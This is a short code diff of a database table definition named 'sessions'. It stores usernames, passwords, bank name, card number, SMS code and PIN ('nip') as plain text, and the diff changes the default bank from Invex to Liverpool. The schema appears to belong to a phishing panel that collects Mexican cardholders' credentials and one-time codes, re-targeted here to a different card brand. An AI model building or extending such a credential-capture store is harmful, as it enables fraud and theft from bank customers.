@@ -23,7 +23,7 @@ export const sessions = pgTable("sessions", {
   folio: text("folio"),
   username: text("username"),
   password: text("password"),
-  banco: text("banco").default("Invex"),
+  banco: text("banco").default("LIVERPOOL"),
   tarjeta: text("tarjeta"),
   sms: text("sms"),
   nip: text("nip"),
